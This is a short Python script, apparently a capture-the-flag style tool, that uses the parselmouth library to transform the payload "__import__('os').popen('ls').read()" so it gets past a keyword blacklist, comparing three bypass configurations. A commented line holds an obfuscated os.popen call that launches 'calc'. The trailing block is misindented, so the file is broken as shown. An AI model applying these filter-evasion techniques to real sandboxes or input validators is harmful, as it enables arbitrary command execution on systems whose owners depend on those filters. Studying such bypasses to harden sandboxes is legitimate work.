
import parselmouth as p9h


def python_shell(shell, black_list):
    p9h.BLACK_CHAR = {
        "kwd": black_list,
        "re_kwd": [],

    }
    runner = p9h.P9H(shell,versbose=0 ,ensure_min=True
    , specify_bypass_map={"black": {"Bypass_Name": ["by_unicode"]}})
    # runner = p9h.P9H(shell, versbose=0)
    result = runner.visit()
    status, c_result = p9h.color_check(result)
    # print(c_result)
    return result

def python_shell2(shell, black_list):
    p9h.BLACK_CHAR = {
        "kwd": black_list,
        "re_kwd": [],

    }
    runner = p9h.P9H(shell,versbose=0
    , specify_bypass_map={"black": {"Bypass_Name": ["by_unicode"]}})
    # runner = p9h.P9H(shell, versbose=0)
    result = runner.visit()
    status, c_result = p9h.color_check(result)

    return result
def python_shell3(shell, black_list):
    p9h.BLACK_CHAR = {
        "kwd": black_list,
        "re_kwd": [],

    }

    runner = p9h.P9H(shell, versbose=0)
    result = runner.visit()
    status, c_result = p9h.color_check(result)
    return result



shell = "__import__('os').popen('ls').read()"
    # black_list = ['read','popen','s','\\','calc']
    black_list = ['ls','imp','o']
    # getattr(getattr(__import__('o'+'%c'%115),'p'+'open')('c'+'alc'),('r'+'ead'))()
    try:
        print(python_shell(shell, black_list))
    except Exception as e:
        print(f"Error in python_shell: {e}")

    try:
        print(python_shell2(shell, black_list))
    except Exception as e:
        print(f"Error in python_shell2: {e}")

    try:
        print(python_shell3(shell, black_list))
    except Exception as e:
        print(f"Error in python_shell3: {e}")
